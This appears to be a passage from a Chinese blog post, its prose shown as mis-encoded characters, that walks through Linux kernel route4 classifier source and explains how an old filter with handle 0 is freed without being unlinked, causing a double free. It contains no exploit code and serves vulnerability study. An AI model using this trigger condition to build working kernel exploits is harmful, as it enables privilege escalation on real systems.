<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct tcf_proto *<span class="title">tcf_proto_create</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *kind, u32 protocol,</span></span></span><br><span class="line"><span class="params"><span class="function">					  u32 prio, struct tcf_chain *chain,</span></span></span><br><span class="line"><span class="params"><span class="function">					  <span class="keyword">bool</span> rtnl_held,</span></span></span><br><span class="line"><span class="params"><span class="function">					  struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto</span> *<span class="title">tp</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	tp = kzalloc(<span class="keyword">sizeof</span>(*tp), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!tp)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOBUFS);</span><br><span class="line"></span><br><span class="line">	tp-&gt;ops = tcf_proto_lookup_ops(kind, rtnl_held, extack);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(tp-&gt;ops)) &#123;</span><br><span class="line">		err = PTR_ERR(tp-&gt;ops);</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line">	&#125;</span><br><span class="line">	tp-&gt;classify = tp-&gt;ops-&gt;classify;</span><br><span class="line">	tp-&gt;protocol = protocol;</span><br><span class="line">	tp-&gt;prio = prio;</span><br><span class="line">	tp-&gt;chain = chain;</span><br><span class="line">	spin_lock_init(&amp;tp-&gt;lock);</span><br><span class="line">	refcount_set(&amp;tp-&gt;refcnt, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	err = tp-&gt;ops-&gt;init(tp);</span><br><span class="line">	<span class="keyword">if</span> (err) &#123;</span><br><span class="line">		module_put(tp-&gt;ops-&gt;owner);</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> tp;</span><br><span class="line"></span><br><span class="line">errout:</span><br><span class="line">	kfree(tp);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>tcf_proto_create()</code>ä¸­ä¼šæ ¹æ®<code>name</code>å³<code>kind</code>è°ƒç”¨å‡½æ•°<code>tcf_proto_lookup_ops()</code>è·å¾—å¯¹åº”çš„<code>ops</code>,å†…æ ¸æœ¬æ¥å°±æœ‰ä¸€äº›<code>ops</code>ï¼ŒæŸ¥æ‰¾å¯¹åº”opsçš„åŸç†å°±æ˜¯å¯¹æ¯”<code>kind==ops-&gt;kind</code>ï¼Œå¦‚æœç­‰äºé‚£å°±è¿”å›è¿™ä¸ªopsçš„é¦–åœ°å€ã€‚</p>
<p>æ¯”å¦‚å¦‚æœä¼ å…¥çš„<code>kind=&quot;route&quot;</code>å°±ä¼šè¿”å›è¿™æ ·çš„<code>ops</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto_ops</span> <span class="title">cls_route4_ops</span> __<span class="title">read_mostly</span> =</span> &#123;</span><br><span class="line">	.kind		=	<span class="string">&quot;route&quot;</span>,</span><br><span class="line">	.classify	=	route4_classify,</span><br><span class="line">	.init		=	route4_init,</span><br><span class="line">	.destroy	=	route4_destroy,</span><br><span class="line">	.get		=	route4_get,</span><br><span class="line">	.change		=	route4_change,</span><br><span class="line">	.<span class="keyword">delete</span>		=	route4_delete,</span><br><span class="line">	.walk		=	route4_walk,</span><br><span class="line">	.dump		=	route4_dump,</span><br><span class="line">	.bind_class	=	route4_bind_class,</span><br><span class="line">	.owner		=	THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>ç„¶ååˆå§‹åŒ–<code>tp</code>çš„ä¸€äº›å­—æ®µã€‚</p>
<p>æœ€åè°ƒç”¨<code>tp-&gt;ops-&gt;init</code>å³<code>route4_init</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°åˆ›å»ºäº†ä¸€ä¸ª<code>rout4_head</code>ç»“æ„ä½“ç”¨äºå­˜æ”¾è¿‡æ»¤å™¨å¯¹åº”çš„å“ˆå¸Œå€¼</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">route4_init</span><span class="params">(struct tcf_proto *tp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> *<span class="title">head</span>;</span></span><br><span class="line"></span><br><span class="line">	head = kzalloc(<span class="keyword">sizeof</span>(struct route4_head), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (head == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOBUFS;</span><br><span class="line"></span><br><span class="line">	rcu_assign_pointer(tp-&gt;root, head);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_fastmap</span>		<span class="title">fastmap</span>[16];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> __<span class="title">rcu</span>	*<span class="title">table</span>[256 + 1];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>			<span class="title">rcu</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿”å›åˆ°<code>tc_new_tfilter</code>å‡½æ•°ä¸­ï¼ŒæŠŠæ–°åˆ›å»ºå¹¶ä¸”åˆå§‹åŒ–çš„<code>tp</code>æ’å…¥åˆ°<code>chain</code>ä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tp = tcf_chain_tp_insert_unique(chain, tp_new, protocol, prio,</span><br><span class="line">						rtnl_held);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(tp)) &#123;</span><br><span class="line">			err = PTR_ERR(tp);</span><br><span class="line">			<span class="keyword">goto</span> errout_tp;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		mutex_unlock(&amp;chain-&gt;filter_chain_lock);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åè°ƒç”¨<code>tp-&gt;ops-&gt;get</code>å³<code>route4_get()</code></p>
<p>æ ¹æ®handleä»route4_headé“¾è¡¨ä¸­è·å–å¯¹åº”çš„route4_filterã€‚å¦‚æœä¸ºç©ºä¸”<code>n-&gt;nlmsg_flags &amp; NLM_F_CREATE)</code>å­˜åœ¨æˆ–è€…ä¸ä¸ºç©ºä½†<code>n-&gt;nlmsg_flags &amp; NLM_F_CREATE)</code>ä¸å­˜åœ¨åˆ™è°ƒç”¨<code>tp-&gt;ops-&gt;change</code>å³<code>rout4_change</code>åˆ›å»º</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">err = tp-&gt;ops-&gt;change(net, skb, tp, cl, t-&gt;tcm_handle, tca, &amp;fh,</span><br><span class="line">			      flags, extack);</span><br><span class="line">	<span class="keyword">if</span> (err == <span class="number">0</span>) &#123;</span><br><span class="line">		tfilter_notify(net, skb, n, tp, block, q, parent, fh,</span><br><span class="line">			       RTM_NEWTFILTER, <span class="literal">false</span>, rtnl_held);</span><br><span class="line">		tfilter_put(tp, fh);</span><br><span class="line">		<span class="comment">/* q pointer is NULL for shared blocks */</span></span><br><span class="line">		<span class="keyword">if</span> (q)</span><br><span class="line">			q-&gt;flags &amp;= ~TCQ_F_CAN_BYPASS;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>è€Œ<code>rout4_change()</code>å°±æ˜¯æ¼æ´äº§ç”Ÿçš„æ¨¡å—ã€‚</p>
<p>ç¡¬ç€å¤´çš®çœ‹äº†åŠä¸ªæ™šä¸Šçš„ä»£ç ç»ˆäºå¤§æ¦‚ææ‡‚äº†ç›¸å…³çš„ç»“æ„ä½“çš„å…³ç³»ä»¥åŠæ¼æ´åŸå› ã€‚</p>
<p>é¦–å…ˆæ˜¯æœ‰ä¸€ä¸ªç»“æ„ä½“<code>chain</code>,è¿™ä¸ªç»“æ„ä½“è®°å½•äº†ä¸€ä¸ª<code>tp</code>çš„é“¾è¡¨ï¼Œç„¶å<code>tc_new_tfilter()</code>å‡½æ•°æ ¹æ®ç”¨æˆ·ä¼ è¿›æ¥çš„ä¸€äº›å‚æ•°ç¡®å®šä¸€ä¸ª<code>tp</code>å¦‚æœæ‰¾ä¸åˆ°è¿™ä¸ª<code>tp</code>é‚£å°±åˆ›å»ºä¸€ä¸ªæ–°çš„<code>tp</code>ï¼Œå…³é”®çš„æ˜¯è¿˜ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„<code>route4_head</code>,è®°å½•åœ¨è¿™ä¸ªæ–°<code>tp</code>çš„å­—æ®µé‡Œï¼Œè¿™ä¸ª<code>route4_head</code>å°±æ˜¯ä¸€ä¸ªå“ˆå¸Œæ¡¶ï¼Œä¸»è¦è®°å½•<code>route4_filter</code>ç»“æ„ä½“ï¼Œ<code>route4_head</code>ç»“æ„ä½“å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_fastmap</span>		<span class="title">fastmap</span>[16];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> __<span class="title">rcu</span>	*<span class="title">table</span>[256 + 1];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>			<span class="title">rcu</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> &#123;</span></span><br><span class="line">	<span class="comment">/* 16 FROM buckets + 16 IIF buckets + 1 wildcard bucket */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> __<span class="title">rcu</span>	*<span class="title">ht</span>[16 + 16 + 1];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>			<span class="title">rcu</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> __<span class="title">rcu</span>	*<span class="title">next</span>;</span></span><br><span class="line">	u32			id;</span><br><span class="line">	<span class="keyword">int</span>			iif;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_result</span>	<span class="title">res</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_exts</span>		<span class="title">exts</span>;</span></span><br><span class="line">	u32			handle;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span>	*<span class="title">bkt</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto</span>	*<span class="title">tp</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_work</span>		<span class="title">rwork</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥æ¸…æ™°çš„çœ‹è§å°±æ˜¯ä¸€ä¸ªå“ˆå¸Œæ¡¶ï¼Œ<code>tp-&gt;ops-&gt;get()</code>æ˜¯ä¼šæ ¹æ®ç”¨æˆ·ä¼ å…¥çš„<code>handle</code>æ‰¾å¯¹åº”<code>route4_filter</code>ï¼Œæ‰¾åˆ°çš„è¯è¿”å›ï¼Œæ²¡æ‰¾åˆ°è¿”å›<code>null</code>ã€‚</p>
<p>æ¥ç€è°ƒç”¨<code>tp-&gt;ops-&gt;change()</code>å‡½æ•°ï¼ŒæŠŠ<code>get()</code>å‡½æ•°æ‰¾åˆ°çš„æ—§çš„è¿‡æ»¤å™¨ä¹Ÿä¼ å…¥,<code>change</code>é¦–å…ˆæ˜¯ä¼šæŠŠæ–°çš„è¿‡æ»¤å™¨æ’å…¥åˆ°å“ˆå¸Œæ¡¶å³<code>route4_head</code>ä¸­ï¼Œæ¥ç€åˆ¤æ–­æ—§çš„è¿‡æ»¤å™¨<code>fold</code>æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨çš„è¯å…ˆæŠŠå¥¹ä»å“ˆå¸Œæ¡¶ä¸­ç§»å‡ºæ¥ï¼Œç„¶åæŠŠä»–<code>kfree</code>æ‰ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">route4_change</span><span class="params">(struct net *net, struct sk_buff *in_skb,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct tcf_proto *tp, <span class="keyword">unsigned</span> <span class="keyword">long</span> base, u32 handle,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct nlattr **tca, <span class="keyword">void</span> **arg, u32 flags,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> *<span class="title">head</span> =</span> rtnl_dereference(tp-&gt;root);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> __<span class="title">rcu</span> **<span class="title">fp</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">fold</span>, *<span class="title">f1</span>, *<span class="title">pfp</span>, *<span class="title">f</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> *<span class="title">b</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">opt</span> =</span> tca[TCA_OPTIONS];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tb</span>[<span class="title">TCA_ROUTE4_MAX</span> + 1];</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> h, th;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="keyword">bool</span> <span class="keyword">new</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (opt == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> handle ? -EINVAL : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	err = nla_parse_nested_deprecated(tb, TCA_ROUTE4_MAX, opt,</span><br><span class="line">					  route4_policy, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	fold = *arg;</span><br><span class="line">	<span class="keyword">if</span> (fold &amp;&amp; handle &amp;&amp; fold-&gt;handle != handle)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	err = -ENOBUFS;</span><br><span class="line">	f = kzalloc(<span class="keyword">sizeof</span>(struct route4_filter), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!f)</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">	err = tcf_exts_init(&amp;f-&gt;exts, net, TCA_ROUTE4_ACT, TCA_ROUTE4_POLICE);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fold) &#123;</span><br><span class="line">		f-&gt;id = fold-&gt;id;</span><br><span class="line">		f-&gt;iif = fold-&gt;iif;</span><br><span class="line">		f-&gt;res = fold-&gt;res;</span><br><span class="line">		f-&gt;handle = fold-&gt;handle;</span><br><span class="line"></span><br><span class="line">		f-&gt;tp = fold-&gt;tp;</span><br><span class="line">		f-&gt;bkt = fold-&gt;bkt;</span><br><span class="line">		<span class="keyword">new</span> = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = route4_set_parms(net, tp, base, f, handle, head, tb,</span><br><span class="line">			       tca[TCA_RATE], <span class="keyword">new</span>, flags, extack);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">	h = from_hash(f-&gt;handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line">	fp = &amp;f-&gt;bkt-&gt;ht[h];</span><br><span class="line">	<span class="keyword">for</span> (pfp = rtnl_dereference(*fp);</span><br><span class="line">	     (f1 = rtnl_dereference(*fp)) != <span class="literal">NULL</span>;</span><br><span class="line">	     fp = &amp;f1-&gt;next)</span><br><span class="line">		<span class="keyword">if</span> (f-&gt;handle &lt; f1-&gt;handle)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	tcf_block_netif_keep_dst(tp-&gt;chain-&gt;block);</span><br><span class="line">	rcu_assign_pointer(f-&gt;next, f1);</span><br><span class="line">	rcu_assign_pointer(*fp, f);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fold &amp;&amp; fold-&gt;handle &amp;&amp; f-&gt;handle != fold-&gt;handle) &#123;</span><br><span class="line">		th = to_hash(fold-&gt;handle);</span><br><span class="line">		h = from_hash(fold-&gt;handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line">		b = rtnl_dereference(head-&gt;table[th]);</span><br><span class="line">		<span class="keyword">if</span> (b) &#123;</span><br><span class="line">			fp = &amp;b-&gt;ht[h];</span><br><span class="line">			<span class="keyword">for</span> (pfp = rtnl_dereference(*fp); pfp;</span><br><span class="line">			     fp = &amp;pfp-&gt;next, pfp = rtnl_dereference(*fp)) &#123;</span><br><span class="line">				<span class="keyword">if</span> (pfp == fold) &#123;</span><br><span class="line">					rcu_assign_pointer(*fp, fold-&gt;next);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	route4_reset_fastmap(head);</span><br><span class="line">	*arg = f;</span><br><span class="line">	<span class="keyword">if</span> (fold) &#123;</span><br><span class="line">		tcf_unbind_filter(tp, &amp;fold-&gt;res);</span><br><span class="line">		tcf_exts_get_net(&amp;fold-&gt;exts);</span><br><span class="line">		tcf_queue_work(&amp;fold-&gt;rwork, route4_delete_filter_work);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">errout:</span><br><span class="line">	<span class="keyword">if</span> (f)</span><br><span class="line">		tcf_exts_destroy(&amp;f-&gt;exts);</span><br><span class="line">	kfree(f);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>å…³é”®æ–‡ä»¶å°±æ˜¯å‡ºåœ¨äº†<code>route4_change</code>ä¸­æŠŠæ—§çš„è¿‡æ»¤å™¨å³<code>struct route4_filter</code>ç»“æ„ä½“ä»å“ˆå¸Œæ¡¶ä¸­ç§»å‡ºæ¥ï¼Œç„¶åæŠŠä»–<code>kfree</code>æ‰ï¼Œä½†æ˜¯çœ‹å…³é”®ä»£ç ,é¦–å…ˆä½¿ç”¨ifåˆ¤æ–­è¿™ä¸ªè¿™ä¸ª<code>fold</code>æ˜¯å¦å­˜åœ¨ä»¥åŠä»–çš„<code>handle</code>æ˜¯å¦å­˜åœ¨ï¼Œè¿˜è¦æ»¡è¶³<code>f-&gt;handle != fold-&gt;handle</code>æ‰è¿›å…¥å¾ªç¯é‡Œä»å“ˆå¸Œæ¡¶ä¸­è„±é“¾ï¼Œå¦‚æœæ¡ä»¶ä¸æ»¡è¶³é‚£å°±è¿›å…¥ä¸‹ä¸€ä¸ªåˆ¤æ–­ï¼Œè¿™ä¸ªåˆ¤æ–­åªæ˜¯åˆ¤æ–­<code>fold</code>æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨çš„è¯å°±è¡¨ç¤ºæ—§çš„è¿‡æ»¤å™¨å­˜åœ¨ï¼Œç„¶åæŠŠä»–<code>kfree</code>æ‰ã€‚</p>
<p>å¯è§ç”±äºè„±é“¾æ—¶åˆ¤æ–­æ—§è¿‡æ»¤å™¨æ˜¯å¦å­˜åœ¨å’Œ<code>kfree</code>æ—¶åˆ¤æ–­æ—§è¿‡æ»¤å™¨æ˜¯å¦å­˜åœ¨çš„åˆ¤æ–­ä¾æ®ä¸ä¸€æ ·ï¼Œè¿™å°±ä¼šå¯¼è‡´æ­§ä¹‰çš„å‡ºç°ã€‚å‡è®¾è¿™æ ·ä¸€ç§æƒ…å†µï¼Œæ—§è¿‡æ»¤å™¨çš„<code>handle</code>ä¸º0ï¼Œå°±ä¼šå¯¼è‡´è¿™ä¸ªæ—§çš„è¿‡æ»¤å™¨ä¸ä¼šè¢«è„±é“¾ä½†æ˜¯ä¼šè¢«kfreeã€‚è¿™å°±å¯ä»¥é€ æˆdoublefree.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fold &amp;&amp; fold-&gt;handle &amp;&amp; f-&gt;handle != fold-&gt;handle) &#123;</span><br><span class="line">		th = to_hash(fold-&gt;handle);</span><br><span class="line">		h = from_hash(fold-&gt;handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line">		b = rtnl_dereference(head-&gt;table[th]);</span><br><span class="line">		<span class="keyword">if</span> (b) &#123;</span><br><span class="line">			fp = &amp;b-&gt;ht[h];</span><br><span class="line">			<span class="keyword">for</span> (pfp = rtnl_dereference(*fp); pfp;</span><br><span class="line">			     fp = &amp;pfp-&gt;next, pfp = rtnl_dereference(*fp)) &#123;</span><br><span class="line">				<span class="keyword">if</span> (pfp == fold) &#123;</span><br><span class="line">					rcu_assign_pointer(*fp, fold-&gt;next);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	route4_reset_fastmap(head);</span><br><span class="line">	*arg = f;</span><br><span class="line">	<span class="keyword">if</span> (fold) &#123;</span><br><span class="line">		tcf_unbind_filter(tp, &amp;fold-&gt;res);</span><br><span class="line">		tcf_exts_get_net(&amp;fold-&gt;exts);</span><br><span class="line">		tcf_queue_work(&amp;fold-&gt;rwork, route4_delete_filter_work);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

